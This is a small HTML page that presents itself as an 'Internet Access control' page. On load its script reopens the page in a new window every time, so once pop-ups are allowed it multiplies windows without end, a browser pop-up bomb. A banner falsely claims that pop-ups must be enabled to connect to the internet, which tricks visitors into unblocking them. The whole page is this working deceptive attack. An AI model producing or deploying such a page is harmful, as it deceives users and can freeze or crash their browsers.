<html>
<head>
    <title>Allow Pop-up</title>
    <script>
        function erneut(){
            window.open(self.location,'');
			      const messageDiv = document.createElement('div');
            messageDiv.style.position = 'fixed';
            messageDiv.style.bottom = '10px';
            messageDiv.style.left = '50%';
            messageDiv.style.transform = 'translateX(-50%)';
            messageDiv.style.padding = '10px 20px';
            messageDiv.style.backgroundColor = '#ffcc00';
            messageDiv.style.color = '#000';
            messageDiv.style.borderRadius = '10px';
            messageDiv.style.boxShadow = '0 4px 6px rgba(0, 0, 0, 0.1)';
            messageDiv.style.fontFamily = 'Arial, sans-serif';
            messageDiv.style.textAlign = 'center';
            messageDiv.innerHTML = '⚠️ Active pop-ups to connect to internet. <br> <span style="font-size: 24px;">⬆️</span>';
            
            document.body.appendChild(messageDiv);
        }
        window.onload = erneut;
		
    </script>
</head>
<body>
    <h1>Internet Access control</h1>
</body>
